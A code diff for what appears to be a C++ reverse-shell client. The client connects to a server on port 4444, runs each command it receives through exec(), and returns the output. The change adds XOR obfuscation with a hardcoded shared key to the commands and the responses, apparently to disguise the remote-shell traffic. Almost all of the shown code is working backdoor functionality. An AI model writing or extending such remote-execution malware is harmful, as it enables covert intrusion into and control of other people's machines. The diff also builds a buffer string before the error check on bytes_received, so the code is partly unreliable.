@@ -5,6 +5,10 @@
 #include <sys/socket.h>
 #include <unistd.h>
 
+#include "encryption.hpp"
+
+const std::string XOR_KEY = "mysecretkey"; // Shared key
+
 constexpr const char *SERVER_IP = "127.0.0.1";
 constexpr int PORT = 4444;
 
@@ -44,16 +48,24 @@ int main() {
 
   while (true) {
     int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
+    std::string encrypted(buffer, bytes_received);
+
     if (bytes_received <= 0)
       break;
 
-    std::string command(buffer, bytes_received);
+    // std::string command(buffer, bytes_received);
+
+    // decrypt commands recieved
+    std::string command = xor_decrypt(encrypted, XOR_KEY);
 
     if (command == "exit")
       break;
 
     std::string output = exec(command);
-    send(sock, output.c_str(), output.size(), 0);
+
+    // send(sock, output.c_str(), output.size(), 0);
+    std::string encrypted_output = xor_encrypt(output, XOR_KEY);
+    send(sock, encrypted_output.c_str(), encrypted_output.size(), 0);
   }
 
   close(sock);
